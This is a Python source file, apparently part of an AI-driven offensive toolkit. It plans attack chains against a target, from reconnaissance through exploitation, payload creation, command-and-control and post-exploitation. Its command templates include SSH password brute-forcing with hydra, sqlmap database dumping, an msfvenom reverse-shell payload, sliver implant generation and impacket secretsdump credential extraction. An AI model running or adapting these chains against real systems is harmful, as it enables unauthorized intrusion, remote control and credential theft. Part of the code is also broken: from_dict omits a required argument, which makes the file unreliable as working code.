#!/usr/bin/env python3
"""Workflow Planner — Breaks goals into subtasks, creates execution plans with dependencies."""

import json, hashlib, time
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional
from dataclasses import dataclass, field

DATA_DIR = Path("/home/kali/HackWithAI/data/logs/workflow")
DATA_DIR.mkdir(parents=True, exist_ok=True)


@dataclass
class Task:
    id: str
    name: str
    phase: str
    tool: str = ""
    command: str = ""
    depends_on: List[str] = field(default_factory=list)
    priority: int = 5
    max_retries: int = 2
    timeout: int = 300
    status: str = "pending"
    result: str = ""
    started: str = ""
    completed: str = ""


@dataclass
class ExecutionPlan:
    id: str
    target: str
    tasks: List[Task]
    created: str = field(default_factory=lambda: datetime.now().isoformat())
    status: str = "created"


class Planner:
    """Breaks attack goals into ordered subtasks with dependencies."""

    PHASES = ["recon", "scan", "vuln_check", "exploit", "payload", "c2", "post_exploit", "report"]

    PHASE_TOOLS = {
        "recon": ["nmap", "dnsrecon", "theHarvester"],
        "scan": ["gobuster", "nikto", "wpscan", "ffuf"],
        "vuln_check": ["searchsploit", "nuclei", "cvemap"],
        "exploit": ["sqlmap", "hydra", "metasploit", "john"],
        "payload": ["msfvenom", "veil", "upx"],
        "c2": ["empire", "sliver", "covenant"],
        "post_exploit": ["mimikatz", "bloodhound", "impacket"],
        "report": ["generate", "compile"],
    }

    def plan(self, target: str, phases: List[str] = [],
             tools: List[str] = [], context: str = "") -> ExecutionPlan:
        """Create an execution plan from target and desired phases."""
        plan_id = hashlib.md5(f"{target}{time.time()}".encode()).hexdigest()[:10]
        active_phases = phases or self.PHASES[:5]
        tasks = []
        prev_task_id = ""

        for i, phase in enumerate(active_phases):
            phase_tools = tools or self.PHASE_TOOLS.get(phase, ["custom"])
            tool = phase_tools[0]

            task = Task(
                id=f"{plan_id}_{i}",
                name=f"{phase.title()} {target}",
                phase=phase,
                tool=tool,
                command=self._suggest_command(phase, tool, target),
                depends_on=[prev_task_id] if prev_task_id else [],
                priority=max(1, 10 - i),
                timeout=self._phase_timeout(phase),
            )
            tasks.append(task)
            prev_task_id = task.id

        plan = ExecutionPlan(id=plan_id, target=target, tasks=tasks)
        return plan

    def _suggest_command(self, phase: str, tool: str, target: str) -> str:
        suggestions = {
            ("recon", "nmap"): f"nmap -sV -sC -O -T4 {target}",
            ("scan", "gobuster"): f"gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt",
            ("scan", "nikto"): f"nikto -h http://{target}",
            ("vuln_check", "searchsploit"): f"searchsploit {target}",
            ("exploit", "sqlmap"): f"sqlmap -u http://{target} --batch --dbs",
            ("exploit", "hydra"): f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} ssh",
            ("payload", "msfvenom"): f"msfvenom -p linux/x64/shell_reverse_tcp LHOST=0.0.0.0 LPORT=4444 -f elf",
            ("c2", "sliver"): f"sliver generate --os linux --lhost 0.0.0.0",
            ("post_exploit", "impacket"): f"impacket-secretsdump target/{target}",
        }
        return suggestions.get((phase, tool), f"{tool} {target}")

    def _phase_timeout(self, phase: str) -> int:
        timeouts = {"recon": 120, "scan": 300, "vuln_check": 180, "exploit": 600, "payload": 120, "c2": 300, "post_exploit": 600, "report": 60}
        return timeouts.get(phase, 300)

    def add_phase(self, plan: ExecutionPlan, phase: str, tool: str = "",
                  command: str = "", depends_on: str = "") -> ExecutionPlan:
        idx = len(plan.tasks)
        plan.tasks.append(Task(
            id=f"{plan.id}_{idx}",
            name=f"{phase.title()} {plan.target}",
            phase=phase, tool=tool or self.PHASE_TOOLS.get(phase, ["custom"])[0],
            command=command or self._suggest_command(phase, tool or "custom", plan.target),
            depends_on=[depends_on] if depends_on else [],
            timeout=self._phase_timeout(phase),
        ))
        return plan

    def to_dict(self, plan: ExecutionPlan) -> Dict:
        return {"id": plan.id, "target": plan.target, "created": plan.created,
                "status": plan.status, "tasks": [t.__dict__ for t in plan.tasks]}

    @staticmethod
    def from_dict(data: Dict) -> ExecutionPlan:
        plan = ExecutionPlan(id=data["id"], target=data["target"],
                            created=data.get("created", ""), status=data.get("status", "created"))
        plan.tasks = [Task(**t) for t in data.get("tasks", [])]
        return plan
